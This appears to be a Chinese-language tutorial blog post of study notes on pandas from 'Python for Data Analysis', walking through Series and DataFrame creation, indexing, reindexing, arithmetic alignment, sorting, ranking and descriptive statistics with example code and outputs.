    <content type="text"><![CDATA[《利用 python 进行数据分析*第二版》 123456import pandas as pdfrom pandas import Series, DataFrameimport numpy as npfrom numpy import nan as NAimport sqlite3import re 基础部分数据结构Series 数据结构Series 数据结构就是列表和字典的结合体，下面看一下具体演示 123# 创建obj = pd.Series([4, 7, -5, 3])obj 0 4 1 7 2 -5 3 3 dtype: int64 12# 获取索引obj.index RangeIndex(start=0, stop=4, step=1) 12# 获取值obj.values array([ 4, 7, -5, 3], dtype=int64) 123# 创建的同时制定索引obj2 = pd.Series([4, 7, -5, 3], index=['d', 'b', 'a', 'c'])obj2 d 4 b 7 a -5 c 3 dtype: int64 1obj2.index Index([&apos;d&apos;, &apos;b&apos;, &apos;a&apos;, &apos;c&apos;], dtype=&apos;object&apos;) 1obj2.values array([ 4, 7, -5, 3], dtype=int64) 1234# 通过字典进行创建sdata = &#123;'Ohio': 35000, 'Texas': 71000, 'Oregon': 16000, 'Utah': 5000&#125;obj3 = pd.Series(sdata)obj3 Ohio 35000 Texas 71000 Oregon 16000 Utah 5000 dtype: int64 可以传入排好序的字典的键以改变顺序sdata 中跟 states 索引相匹配的那3个值会被找出来并放到相应的位置上，但由于”California”所对应的 sdata 值找不到，所以其结果就为 NaN（即“非数字”（not a number），在 pandas 中，它用于表示缺失或 NA 值）。因为‘Utah’不在 states 中，它被从结果中除去。 123states = ['California', 'Ohio', 'Oregon', 'Texas']obj4 = pd.Series(sdata, index=states)obj4 California NaN Ohio 35000.0 Oregon 16000.0 Texas 71000.0 dtype: float64 12# 判断索引是否存在'ding' in obj4 False 1'Ohio' in obj4 True Series 对象本身及其索引都有一个 name 属性，该属性跟pandas其他的关键功能关系非常密切： 123obj4.name = 'population'obj4.index.name = 'state'obj4 state California NaN Ohio 35000.0 Oregon 16000.0 Texas 71000.0 Name: population, dtype: float64 Series 的索引可以通过赋值的方式就地修改 12obj4.index = ['Bob', 'Steve', 'Jeff', 'Ryan']obj4 Bob NaN Steve 35000.0 Jeff 16000.0 Ryan 71000.0 Name: population, dtype: float64 DataFrame 数据结构DataFrame是一个表格型的数据结构，它含有一组有序的列，每列可以是不同的值类型（数值、字符串、布尔值等）。DataFrame既有行索引也有列索引，它可以被看做由Series组成的字典（共用同一个索引）。DataFrame中的数据是以一个或多个二维块存放的（而不是列表、字典或别的一维数据结构）。 columns 相当于 sql 中的字段， index 相当于 sql 中的索引 建DataFrame的办法有很多，最常用的一种是直接传入一个由等长列表或NumPy数组组成的字典 12345data = &#123;'state': ['Ohio', 'Ohio', 'Ohio', 'Nevada', 'Nevada', 'Nevada'], 'year': [2000, 2001, 2002, 2001, 2002, 2003], 'pop': [1.5, 1.7, 3.6, 2.4, 2.9, 3.2]&#125;frame = pd.DataFrame(data)frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } state year pop 0 Ohio 2000 1.5 1 Ohio 2001 1.7 2 Ohio 2002 3.6 3 Nevada 2001 2.4 4 Nevada 2002 2.9 5 Nevada 2003 3.2 12# 读取前 5 行，数据量大的时候非常有用frame.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } state year pop 0 Ohio 2000 1.5 1 Ohio 2001 1.7 2 Ohio 2002 3.6 3 Nevada 2001 2.4 4 Nevada 2002 2.9 如果指定了列序列，则DataFrame的列就会按照指定顺序进行排列 12# 制定列顺序pd.DataFrame(data, columns=['year', 'state', 'pop']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year state pop 0 2000 Ohio 1.5 1 2001 Ohio 1.7 2 2002 Ohio 3.6 3 2001 Nevada 2.4 4 2002 Nevada 2.9 5 2003 Nevada 3.2 123# 同时制定 列名 和 索引名frame2 = pd.DataFrame(data, columns=['year', 'state', 'pop', 'debt'],index=['one', 'two', 'three', 'four', 'five', 'six'])frame2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year state pop debt one 2000 Ohio 1.5 NaN two 2001 Ohio 1.7 NaN three 2002 Ohio 3.6 NaN four 2001 Nevada 2.4 NaN five 2002 Nevada 2.9 NaN six 2003 Nevada 3.2 NaN 12# 获取 列名frame2.columns Index([&apos;year&apos;, &apos;state&apos;, &apos;pop&apos;, &apos;debt&apos;], dtype=&apos;object&apos;) 12# 获取某一列frame2['state'] one Ohio two Ohio three Ohio four Nevada five Nevada six Nevada Name: state, dtype: object 1frame2.state one Ohio two Ohio three Ohio four Nevada five Nevada six Nevada Name: state, dtype: object 12# 选取某一行frame2.loc['one'] year 2000 state Ohio pop 1.5 debt NaN Name: one, dtype: object 123# 赋值frame2['debt'] = 16.5frame2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year state pop debt one 2000 Ohio 1.5 16.5 two 2001 Ohio 1.7 16.5 three 2002 Ohio 3.6 16.5 four 2001 Nevada 2.4 16.5 five 2002 Nevada 2.9 16.5 six 2003 Nevada 3.2 16.5 将列表或数组赋值给某个列时，其长度必须跟DataFrame的长度相匹配。如果赋值的是一个Series，就会精确匹配DataFrame的索引，所有的空位都将被填上缺失值： 123val = pd.Series([-1.2, -1.5, -1.7], index=['two', 'four', 'five'])frame2['debt'] = valframe2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year state pop debt one 2000 Ohio 1.5 NaN two 2001 Ohio 1.7 -1.2 three 2002 Ohio 3.6 NaN four 2001 Nevada 2.4 -1.5 five 2002 Nevada 2.9 -1.7 six 2003 Nevada 3.2 NaN 为不存在的列赋值会创建出一个新列。关键字del用于删除列。 123# 创建一个新列frame2['test'] = frame2.state == 'Ohio'frame2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year state pop debt test one 2000 Ohio 1.5 NaN True two 2001 Ohio 1.7 -1.2 True three 2002 Ohio 3.6 NaN True four 2001 Nevada 2.4 -1.5 False five 2002 Nevada 2.9 -1.7 False six 2003 Nevada 3.2 NaN False 123# 删除一列del frame2['test']frame2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year state pop debt one 2000 Ohio 1.5 NaN two 2001 Ohio 1.7 -1.2 three 2002 Ohio 3.6 NaN four 2001 Nevada 2.4 -1.5 five 2002 Nevada 2.9 -1.7 six 2003 Nevada 3.2 NaN 另一种常见的数据形式是嵌套字典：如果嵌套字典传给DataFrame，pandas就会被解释为：外层字典的键作为列，内层键则作为行索引： 123pop = &#123;'Nevada': &#123;2001: 2.4, 2002: 2.9&#125;, 'Ohio': &#123;2000: 1.5, 2001: 1.7, 2002: 3.6&#125;&#125;frame3 = pd.DataFrame(pop)frame3 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Nevada Ohio 2000 NaN 1.5 2001 2.4 1.7 2002 2.9 3.6 如果设置了 DataFrame 的 index 和 columns 的 name 属性，则这些信息也会被显示出来： 12frame3.index.name = 'year'; frame3.columns.name = 'state'frame3 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } state Nevada Ohio year 2000 NaN 1.5 2001 2.4 1.7 2002 2.9 3.6 12# 获取值frame3.values array([[nan, 1.5], [2.4, 1.7], [2.9, 3.6]]) 索引对象pandas的索引对象负责管理轴标签和其他元数据（比如轴名称等）。构建Series或DataFrame时，所用到的任何数组或其他序列的标签都会被转换成一个Index：DataFrame 的 index 和 columns 都是索引对象 12obj = pd.Series(range(3), index=['a', 'b', 'c'])obj.index Index([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;], dtype=&apos;object&apos;) 1frame3 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } state Nevada Ohio year 2000 NaN 1.5 2001 2.4 1.7 2002 2.9 3.6 1frame3.columns Index([&apos;Nevada&apos;, &apos;Ohio&apos;], dtype=&apos;object&apos;, name=&apos;state&apos;) 1frame3.index Int64Index([2000, 2001, 2002], dtype=&apos;int64&apos;, name=&apos;year&apos;) 与python的集合不同，pandas的Index可以包含重复的标签： 12dup_labels = pd.Index(['foo', 'foo', 'bar', 'bar'])dup_labels Index([&apos;foo&apos;, &apos;foo&apos;, &apos;bar&apos;, &apos;bar&apos;], dtype=&apos;object&apos;) Index 索引对象有一些方法和属性，不怎么用 1dup_labels.unique() Index([&apos;foo&apos;, &apos;bar&apos;], dtype=&apos;object&apos;) 基本功能重新索引 reindexpandas对象的一个重要方法是reindex，其作用是创建一个新对象，它的数据符合新的索引。 12obj = pd.Series([4.5, 7.2, -5.3, 3.6], index=['d', 'b', 'a', 'c'])obj d 4.5 b 7.2 a -5.3 c 3.6 dtype: float64 用该Series的reindex将会根据新索引进行重排。如果某个索引值当前不存在，就引入缺失值： 12obj2 = obj.reindex(['a', 'b', 'c', 'd', 'e'])obj2 a -5.3 b 7.2 c 3.6 d 4.5 e NaN dtype: float64 重新索引时可能需要做一些插值处理。method选项即可达到此目的，例如，使用 ffill 可以实现前向值填充 12obj3 = pd.Series(['blue', 'purple', 'yellow'], index=[0, 2, 4])obj3 0 blue 2 purple 4 yellow dtype: object 1obj3.reindex(range(6), method='ffill') 0 blue 1 blue 2 purple 3 purple 4 yellow 5 yellow dtype: object 借助 DataFrame，reindex 可以修改（行）索引和列。只传递一个序列时，会重新索引结果的行： 12frame = pd.DataFrame(np.arange(9).reshape((3, 3)), index=['a', 'c', 'd'], columns=['Ohio', 'Texas', 'California'])frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ohio Texas California a 0 1 2 c 3 4 5 d 6 7 8 12# 重建行索引 frame.reindex(['a', 'b', 'c', 'd']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ohio Texas California a 0.0 1.0 2.0 b NaN NaN NaN c 3.0 4.0 5.0 d 6.0 7.0 8.0 12# 重建列索引frame.reindex(columns = ['Texas', 'Utah', 'California']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Texas Utah California a 1 NaN 2 c 4 NaN 5 d 7 NaN 8 reindex函数的各参数及说明 丢弃指定轴上的项 drop丢弃某条轴上的一个或多个项很简单，只要有一个索引数组或列表即可。由于需要执行一些数据整理和集合逻辑，所以drop方法返回的是一个在指定轴上删除了指定值的新对象： 12obj = pd.Series(np.arange(5.), index=['a', 'b', 'c', 'd', 'e'])obj a 0.0 b 1.0 c 2.0 d 3.0 e 4.0 dtype: float64 1obj.drop('c') a 0.0 b 1.0 d 3.0 e 4.0 dtype: float64 对于DataFrame，可以删除任意轴上的索引值。 drop 默认会从行标签（axis 0）删除值(删除行), 通过传递 axis=1 或 axis=&#39;columns&#39; 可以删除列的值 12data = pd.DataFrame(np.arange(16).reshape((4, 4)), index=['Ohio', 'Colorado', 'Utah', 'New York'], columns=['one', 'two', 'three', 'four'])data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four Ohio 0 1 2 3 Colorado 4 5 6 7 Utah 8 9 10 11 New York 12 13 14 15 1data.drop(['Ohio', 'Utah']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four Colorado 4 5 6 7 New York 12 13 14 15 1data.drop('two', axis=1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one three four Ohio 0 2 3 Colorado 4 6 7 Utah 8 10 11 New York 12 14 15 许多函数，如drop，会修改Series或DataFrame的大小或形状，可以就地修改对象，不会返回新的对象： 1obj.drop('c', inplace=True) 1obj a 0.0 b 1.0 d 3.0 e 4.0 dtype: float64 索引、选取和过滤Series索引的工作方式类似于NumPy数组的索引，只不过Series的索引值不只是整数。 12obj = pd.Series(np.arange(4.), index=['a', 'b', 'c', 'd'])obj a 0.0 b 1.0 c 2.0 d 3.0 dtype: float64 1obj['a'] 0.0 1obj[0] 0.0 1obj[:2] a 0.0 b 1.0 dtype: float64 12# 利用标签的切片运算与普通的Python切片运算不同，其末端是包含的：obj['a':'c'] a 0.0 b 1.0 c 2.0 dtype: float64 1obj[['a', 'b', 'd']] a 0.0 b 1.0 d 3.0 dtype: float64 1obj[[1, 3]] b 1.0 d 3.0 dtype: float64 1obj[obj &lt; 2] a 0.0 b 1.0 dtype: float64 用一个值或序列对DataFrame进行索引其实就是获取一个或多个列：用切片 [:] 切的是行 12data = pd.DataFrame(np.arange(16).reshape((4, 4)), index=['Ohio', 'Colorado', 'Utah', 'New York'], columns=['one', 'two', 'three', 'four'])data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four Ohio 0 1 2 3 Colorado 4 5 6 7 Utah 8 9 10 11 New York 12 13 14 15 1data['two'] Ohio 1 Colorado 5 Utah 9 New York 13 Name: two, dtype: int32 1data[['three', 'one']] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } three one Ohio 2 0 Colorado 6 4 Utah 10 8 New York 14 12 12# 切行data["Ohio":"Utah"] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four Ohio 0 1 2 3 Colorado 4 5 6 7 Utah 8 9 10 11 1data[:2] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four Ohio 0 1 2 3 Colorado 4 5 6 7 用 loc 和 iloc 进行选取特殊的标签运算符loc和iloc。它们可以让你用类似NumPy的标记，使用轴标签（loc）或整数索引（iloc），从DataFrame选择行和列的子集。 1data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four Ohio 0 1 2 3 Colorado 4 5 6 7 Utah 8 9 10 11 New York 12 13 14 15 12# 通过标签进行选择data.loc['Ohio', ['one', 'two']] one 0 two 1 Name: Ohio, dtype: int32 1data.loc['Ohio':'Utah', ['one', 'two']] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two Ohio 0 1 Colorado 4 5 Utah 8 9 12# 通过 整数 进行选择data.iloc[2, [0, 1]] one 8 two 9 Name: Utah, dtype: int32 1data.iloc[2:4, [0, 1]] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two Utah 8 9 New York 12 13 pandas可以勉强进行整数索引，但是会导致小bug。我们有包含0,1,2的索引，但这会引起歧义，为了进行统一，如果轴索引含有整数，数据选取总会使用标签。为了更准确，请使用loc（标签）或iloc（整数）： 12ser = pd.Series(np.arange(3.))ser 0 0.0 1 1.0 2 2.0 dtype: float64 12# 下面这个将会出错，因为整数索引中没有 -1 这个值, 不知道基于位置索引还是整数索引，导致歧义ser[-1] 对于非整数索引，不会产生歧义 12ser2 = pd.Series(np.arange(3.), index=['a', 'b', 'c'])ser2[-1] 2.0 算术运算和数据对齐、在算术方法中填充值pandas最重要的一个功能是，它可以对不同索引的对象进行算术运算。在将对象相加时，如果存在不同的索引对，则结果的索引就是该索引对的并集。对于有数据库经验的用户，这就像在索引标签上进行自动外连接。 123s1 = pd.Series([7.3, -2.5, 3.4, 1.5], index=['a', 'c', 'd', 'e'])s2 = pd.Series([-2.1, 3.6, -1.5, 4, 3.1],index=['a', 'c', 'e', 'f', 'g'])s1 a 7.3 c -2.5 d 3.4 e 1.5 dtype: float64 1s2 a -2.1 c 3.6 e -1.5 f 4.0 g 3.1 dtype: float64 12# 索引对齐相加，自动的数据对齐操作在不重叠的索引处引入了NA值s1 + s2 a 5.2 c 1.1 d NaN e 0.0 f NaN g NaN dtype: float64 对于DataFrame，对齐操作会同时发生在行和列上 123df1 = pd.DataFrame(np.arange(9.).reshape((3, 3)), columns=list('bcd'), index=['Ohio', 'Texas', 'Colorado'])df2 = pd.DataFrame(np.arange(12.).reshape((4, 3)), columns=list('bde'), index=['Utah', 'Ohio', 'Texas', 'Oregon'])df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b c d Ohio 0.0 1.0 2.0 Texas 3.0 4.0 5.0 Colorado 6.0 7.0 8.0 1df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e Utah 0.0 1.0 2.0 Ohio 3.0 4.0 5.0 Texas 6.0 7.0 8.0 Oregon 9.0 10.0 11.0 1df1 + df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b c d e Colorado NaN NaN NaN NaN Ohio 3.0 NaN 6.0 NaN Oregon NaN NaN NaN NaN Texas 9.0 NaN 12.0 NaN Utah NaN NaN NaN NaN 在对不同索引的对象进行算术运算时，你可能希望当一个对象中某个轴标签在另一个对象中找不到时填充一个特殊值（比如0） 1df1.add(df2, fill_value=0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b c d e Colorado 6.0 7.0 8.0 NaN Ohio 3.0 1.0 6.0 5.0 Oregon 9.0 NaN 10.0 11.0 Texas 9.0 4.0 12.0 8.0 Utah 0.0 NaN 1.0 2.0 其他算数方法：以字母r开头，它会翻转参数。 123test1 = Series([1, 1, 1])test2 = Series([2, 2, 2])test1.div(test2) 0 0.5 1 0.5 2 0.5 dtype: float64 1test1.rdiv(test2) 0 2.0 1 2.0 2 2.0 dtype: float64 DataFrame和Series之间的运算DataFrame和Series之间的运算,默认是横向进行广播的，如果需要在列上进行广播，就必须使用算数方法计算指定 axis=&#39;index&#39; 12frame = pd.DataFrame(np.arange(12.).reshape((4, 3)), columns=list('bde'), index=['Utah', 'Ohio', 'Texas', 'Oregon'])frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e Utah 0.0 1.0 2.0 Ohio 3.0 4.0 5.0 Texas 6.0 7.0 8.0 Oregon 9.0 10.0 11.0 12series = frame.iloc[0]series b 0.0 d 1.0 e 2.0 Name: Utah, dtype: float64 12# 行上进行广播计算frame + series .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e Utah 0.0 2.0 4.0 Ohio 3.0 5.0 7.0 Texas 6.0 8.0 10.0 Oregon 9.0 11.0 13.0 12# 列上进行广播计算 , 这里出现了问题，因为计算会根据索引进行匹配导致的frame.add(series, axis = 'index') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e Ohio NaN NaN NaN Oregon NaN NaN NaN Texas NaN NaN NaN Utah NaN NaN NaN b NaN NaN NaN d NaN NaN NaN e NaN NaN NaN 123# series2 = frame['b']series2 = frame.loc[:, 'b']series2 Utah 0.0 Ohio 3.0 Texas 6.0 Oregon 9.0 Name: b, dtype: float64 1frame.add(series2, axis = 'index') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e Utah 0.0 1.0 2.0 Ohio 6.0 7.0 8.0 Texas 12.0 13.0 14.0 Oregon 18.0 19.0 20.0 函数应用和映射将函数应用到由各列或行所形成的一维数组上。DataFrame的apply方法即可实现此功能： 12frame = pd.DataFrame(np.random.randn(4, 3), columns=list('bde'), index=['Utah', 'Ohio', 'Texas', 'Oregon'])frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e Utah -0.618453 0.743194 -1.467120 Ohio 0.272335 0.542511 -0.458843 Texas -0.762976 0.330646 0.988022 Oregon -0.207557 0.425898 0.783251 123f = lambda x: x.max() - x.min()# 没一列的最大值减去最小值frame.apply(f) b 1.035311 d 0.412548 e 2.455142 dtype: float64 如果传递 axis=&#39;columns&#39; 到 apply ，这个函数会在每行执行： 1frame.apply(f, axis='columns') Utah 2.210314 Ohio 1.001354 Texas 1.750998 Oregon 0.990809 dtype: float64 传递到apply的函数不是必须返回一个标量，还可以返回由多个值组成的Series： 123def f1(x): return pd.Series([x.min(), x.max()], index=['min', 'max'])frame.apply(f1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e min -0.762976 0.330646 -1.467120 max 0.272335 0.743194 0.988022 元素级的Python函数也是可以用的。假如你想得到frame中各个浮点值的格式化字符串，使用applymap即可： 12format = lambda x: '%.2f' % xframe.applymap(format) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d e Utah -0.62 0.74 -1.47 Ohio 0.27 0.54 -0.46 Texas -0.76 0.33 0.99 Oregon -0.21 0.43 0.78 Series 有一个用于应用元素级函数的 map 方法 12series = pd.Series([1, 2, 3])series.map(format) 0 1.00 1 2.00 2 3.00 dtype: object 排序和排名根据条件对数据集排序（sorting）也是一种重要的内置运算。要对行或列索引进行排序（按字典顺序），可使用 sort_index 方法，它将返回一个已排序的新对象： 12obj = pd.Series(range(4), index=['d', 'a', 'b', 'c'])obj d 0 a 1 b 2 c 3 dtype: int64 按照索引排序 sort_index1obj.sort_index() a 1 b 2 c 3 d 0 dtype: int64 12frame = pd.DataFrame(np.arange(8).reshape((2, 4)), index=['three', 'one'], columns=['d', 'a', 'b', 'c'])frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } d a b c three 0 1 2 3 one 4 5 6 7 12# 按照 0 轴排序frame.sort_index() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } d a b c one 4 5 6 7 three 0 1 2 3 12# 按照 1 轴排序frame.sort_index(axis = 1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d three 1 2 3 0 one 5 6 7 4 数据默认是按升序排序的，但也可以降序排序： 1frame.sort_index(axis=1, ascending=False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } d c b a three 0 3 2 1 one 4 7 6 5 按照值排序 sort_values1obj d 0 a 1 b 2 c 3 dtype: int64 12obj = pd.Series([4, 7, -3, 2])obj.sort_values() 2 -3 3 2 0 4 1 7 dtype: int64 当排序一个DataFrame时，你可能希望根据一个或多个列中的值进行排序。将一个或多个列的名字传递给 sort_values 的 by 选项即可达到该目的： 12frame = pd.DataFrame(&#123;'b': [4, 7, -3, 2], 'a': [0, 1, 0, 1]&#125;)frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b a 0 4 0 1 7 1 2 -3 0 3 2 1 1frame.sort_values(by='b') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b a 2 -3 0 3 2 1 0 4 0 1 7 1 1frame.sort_values(by=['a', 'b']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b a 2 -3 0 0 4 0 3 2 1 1 7 1 默认情况下，rank是通过“为各组分配一个平均排名”的方式破坏平级关系的： 12obj = pd.Series([7, -5, 7, 4, 2, 0, 4])obj 0 7 1 -5 2 7 3 4 4 2 5 0 6 4 dtype: int64 1obj.rank() 0 6.5 1 1.0 2 6.5 3 4.5 4 3.0 5 2.0 6 4.5 dtype: float64 也可以根据值在原数据中出现的顺序给出排名： 1obj.rank(method='first') 0 6.0 1 1.0 2 7.0 3 4.0 4 3.0 5 2.0 6 5.0 dtype: float64 你也可以按降序进行排名： 1obj.rank(ascending=False, method='first') 0 1.0 1 7.0 2 2.0 3 3.0 4 5.0 5 6.0 6 4.0 dtype: float64 rank 方法在 DataFrame 可以在行或列上计算排名： 12frame = pd.DataFrame(&#123;'b': [4.3, 7, -3, 2], 'a': [0, 1, 0, 1], 'c': [-2, 5, 8, -2.5]&#125;)frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b a c 0 4.3 0 -2.0 1 7.0 1 5.0 2 -3.0 0 8.0 3 2.0 1 -2.5 1frame.rank(axis='columns') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b a c 0 3.0 2.0 1.0 1 3.0 1.0 2.0 2 1.0 2.0 3.0 3 3.0 2.0 1.0 排名时用于破坏平级关系的方法 带有重复标签的轴索引重复的标签会导致获取数据是数据结构复杂，不建议使用 12obj = pd.Series(range(5), index=['a', 'a', 'b', 'b', 'c'])obj a 0 a 1 b 2 b 3 c 4 dtype: int64 1obj.index.is_unique False 1obj['a'] a 0 a 1 dtype: int64 汇总和计算描述统计pandas对象拥有一组常用的数学和统计方法。它们大部分都属于约简和汇总统计，用于从Series中提取单个值（如sum或mean）或从DataFrame的行或列中提取一个Series。跟对应的NumPy数组方法相比，它们都是基于没有缺失数据的假设而构建的。 12df = pd.DataFrame([[1.4, np.nan], [7.1, -4.5], [np.nan, np.nan], [0.75, -1.3]], index=['a', 'b', 'c', 'd'], columns=['one', 'two'])df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two a 1.40 NaN b 7.10 -4.5 c NaN NaN d 0.75 -1.3 12# 和 Numpy 不同的是，nan将会忽略掉继续进行计算df.sum() one 9.25 two -5.80 dtype: float64 12# 在 1 周方向计算df.sum(axis=1) a 1.40 b 2.60 c 0.00 d -0.55 dtype: float64 NA值会自动被排除，除非整个切片（这里指的是行或列）都是NA。通过skipna选项可以禁用该功能： 1df.sum(axis=1, skipna = False) a NaN b 2.60 c NaN d -0.55 dtype: float64 所有与描述统计相关的方法 相关系数与协方差有些汇总统计（如相关系数和协方差）是通过参数对计算出来的。我们来看几个DataFrame，它们的数据来自 Yahoo!Finance 的股票价格和成交量，使用的是 pandas-datareader 包（可以用conda或pip安装）：1conda install pandas-datareader 使用pandas_datareader模块下载了一些股票数据： 12345678import pandas_datareader.data as weball_data = &#123;ticker: web.get_data_yahoo(ticker) for ticker in ['AAPL', 'IBM', 'MSFT', 'GOOG']&#125;price = pd.DataFrame(&#123;ticker: data['Adj Close'] for ticker, data in all_data.items()&#125;)volume = pd.DataFrame(&#123;ticker: data['Volume'] for ticker, data in all_data.items()&#125;) 12returns = price.pct_change()returns.tail() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL IBM MSFT GOOG Date 2019-04-11 -0.008324 0.005314 0.001165 0.002046 2019-04-12 -0.000402 0.003964 0.005152 0.010999 2019-04-15 0.001810 -0.003118 0.000827 0.002652 2019-04-16 0.000100 0.008617 -0.002313 0.004938 2019-04-17 0.019473 -0.041546 0.008280 0.007505 Series 的 corr 方法用于计算两个 Series 中重叠的、非NA的、按索引对齐的值的相关系数。与此类似， cov 用于计算协方差： 1returns['MSFT'].corr(returns['IBM']) 0.4865732693083368 1returns['MSFT'].cov(returns['IBM']) 8.677797505286974e-05 DataFrame 的 corr 和 cov 方法将以 DataFrame 的形式分别返回完整的相关系数或协方差矩阵： 1returns.corr() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL IBM MSFT GOOG AAPL 1.000000 0.370756 0.452098 0.458110 IBM 0.370756 1.000000 0.486573 0.407424 MSFT 0.452098 0.486573 1.000000 0.537616 GOOG 0.458110 0.407424 0.537616 1.000000 1returns.cov() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL IBM MSFT GOOG AAPL 0.000269 0.000075 0.000107 0.000116 IBM 0.000075 0.000152 0.000087 0.000077 MSFT 0.000107 0.000087 0.000209 0.000120 GOOG 0.000116 0.000077 0.000120 0.000236 利用DataFrame的corrwith方法，你可以计算其列或行跟另一个Series或DataFrame之间的相关系数。传入一个Series将会返回一个相关系数值Series（针对各列进行计算）： 1returns.corrwith(returns.IBM) AAPL 0.370756 IBM 1.000000 MSFT 0.486573 GOOG 0.407424 dtype: float64 传入一个DataFrame则会计算按列名配对的相关系数。这里，我计算百分比变化与成交量的相关系数： 1volume.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } 